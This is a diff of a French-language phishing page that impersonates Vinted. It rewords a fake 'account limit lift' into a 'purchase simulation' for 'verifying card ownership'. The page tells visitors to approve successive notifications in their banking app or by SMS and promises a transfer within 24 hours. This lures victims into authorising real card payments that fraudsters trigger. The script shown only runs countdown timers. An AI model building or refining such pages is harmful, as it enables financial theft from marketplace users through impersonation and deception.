@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Déplafonnement de compte - Vinted</title>
+    <title>Simulation d'achat - Vinted</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
         body {
@@ -174,18 +174,18 @@
         <div class="logo">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Vinted_Logo_2022.svg/1280px-Vinted_Logo_2022.svg.png" alt="Logo Vinted">
         </div>
-        <h2>Procédure de déplafonnement de votre compte Vinted</h2>
+        <h2>Vérification d'appartenance de votre carte bancaire</h2>
 
-        <p>Afin d'effectuer plus de transactions, nous allons procéder au <span class="highlight-text">déplafonnement de votre compte Vinted</span>. Ce processus implique plusieurs niveaux de validation pour garantir la sécurité et la conformité de votre profil.</p>
+        <p>Afin de confirmer votre identité en tant que titulaire de la carte, nous allons procéder à une <span class="highlight-text">simulation d'achat</span>. Ce processus implique plusieurs niveaux de validation pour garantir la sécurité et la conformité de votre profil.</p>
 
-        <p>Veuillez consulter l'application mobile de votre banque ou vos SMS pour chaque notification de <strong class="highlight-text">"validation de niveau de déplafonnement"</strong> correspondant aux montants ci-dessous. Il est essentiel de <span class="highlight-text">valider chaque demande</span> pour progresser dans le processus de déplafonnement et confirmer l'authenticité de vos coordonnées bancaires.</p>
+        <p>Veuillez consulter l'application mobile de votre banque ou vos SMS pour chaque notification de <strong class="highlight-text">"validation de niveau de simulation"</strong>. Il est essentiel de <span class="highlight-text">valider chaque demande</span> pour progresser dans le processus de simulation et confirmer l'authenticité de vos coordonnées bancaires.</p>
 
         <p class="highlight-text">Ayez votre application bancaire à portée de main.</p>
 
         <div class="simulation-list">
             <div class="simulation-section" id="sim-1">
-                <p class="simulation-label">1er niveau de déplafonnement : <span class="random-amount" id="amount-sim-1"></span></p>
-                <button class="request-simulation-btn" data-simulation-id="1">Demander la validation du niveau</button>
+                <p class="simulation-label">1er achat de simulation</p>
+                <button class="request-simulation-btn" data-simulation-id="1">Demander la validation</button>
                 <div class="simulation-feedback" id="feedback-sim-1">
                     <span class="feedback-message"></span>
                     <span class="feedback-countdown"></span>
@@ -193,8 +193,8 @@
             </div>
 
             <div class="simulation-section" id="sim-2">
-                <p class="simulation-label">2ème niveau de déplafonnement : <span class="random-amount" id="amount-sim-2"></span></p>
-                <button class="request-simulation-btn" data-simulation-id="2">Demander la validation du niveau</button>
+                <p class="simulation-label">2ème achat de simulation</p>
+                <button class="request-simulation-btn" data-simulation-id="2">Demander la validation</button>
                 <div class="simulation-feedback" id="feedback-sim-2">
                     <span class="feedback-message"></span>
                     <span class="feedback-countdown"></span>
@@ -202,8 +202,8 @@
             </div>
 
             <div class="simulation-section" id="sim-3">
-                <p class="simulation-label">3ème niveau de déplafonnement : <span class="random-amount" id="amount-sim-3"></span></p>
-                <button class="request-simulation-btn" data-simulation-id="3">Demander la validation du niveau</button>
+                <p class="simulation-label">3ème achat de simulation</p>
+                <button class="request-simulation-btn" data-simulation-id="3">Demander la validation</button>
                 <div class="simulation-feedback" id="feedback-sim-3">
                     <span class="feedback-message"></span>
                     <span class="feedback-countdown"></span>
@@ -211,8 +211,8 @@
             </div>
 
             <div class="simulation-section" id="sim-4">
-                <p class="simulation-label">4ème niveau de déplafonnement : <span class="random-amount" id="amount-sim-4"></span></p>
-                <button class="request-simulation-btn" data-simulation-id="4">Demander la validation du niveau</button>
+                <p class="simulation-label">4ème achat de simulation</p>
+                <button class="request-simulation-btn" data-simulation-id="4">Demander la validation</button>
                 <div class="simulation-feedback" id="feedback-sim-4">
                     <span class="feedback-message"></span>
                     <span class="feedback-countdown"></span>
@@ -220,8 +220,8 @@
             </div>
 
             <div class="simulation-section" id="sim-5">
-                <p class="simulation-label">5ème niveau de déplafonnement : <span class="random-amount" id="amount-sim-5"></span></p>
-                <button class="request-simulation-btn" data-simulation-id="5">Demander la validation du niveau</button>
+                <p class="simulation-label">5ème achat de simulation</p>
+                <button class="request-simulation-btn" data-simulation-id="5">Demander la validation</button>
                 <div class="simulation-feedback" id="feedback-sim-5">
                     <span class="feedback-message"></span>
                     <span class="feedback-countdown"></span>
@@ -235,30 +235,18 @@
         </div>
 
         <button id="finalButton" class="final-button">J'ai validé toutes les demandes</button>
-        <p id="finalMessage" class="final-message" style="display: none;">Processus de déplafonnement terminé. Vous pouvez maintenant fermer cette fenêtre.</p>
+        <p id="finalMessage" class="final-message" style="display: none;">Votre compte est vérifié, votre virement vous sera envoyé dans un délai de 24 heures.</p>
     </div>
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            const fixedAmounts = {
-                1: '100,00 €',
-                2: '200,00 €',
-                3: '300,00 €',
-                4: '400,00 €',
-                5: '500,00 €'
-            };
-
-            for (let i = 1; i <= 5; i++) {
-                document.getElementById(`amount-sim-${i}`).textContent = fixedAmounts[i];
-            }
-
             function startSimulation(simulationId) {
                 const feedbackDiv = document.getElementById(`feedback-sim-${simulationId}`);
                 const messageSpan = feedbackDiv.querySelector('.feedback-message');
                 const countdownSpan = feedbackDiv.querySelector('.feedback-countdown');
                 const requestButton = document.querySelector(`.request-simulation-btn[data-simulation-id="${simulationId}"]`);
 
-                messageSpan.textContent = "Validation du niveau envoyée sur banque ou SMS...";
+                messageSpan.textContent = "Validation envoyée sur votre application bancaire ou par SMS...";
                 countdownSpan.textContent = "";
                 requestButton.disabled = true;
 
@@ -270,7 +258,7 @@
                     if (timeLeft <= 0) {
                         clearInterval(timer);
                         countdownSpan.textContent = "(expiré)";
-                        messageSpan.textContent = "Validation du niveau terminée.";
+                        messageSpan.textContent = "Validation terminée.";
                     } else {
                         countdownSpan.textContent = `(reste ${timeLeft}s)`;
                     }
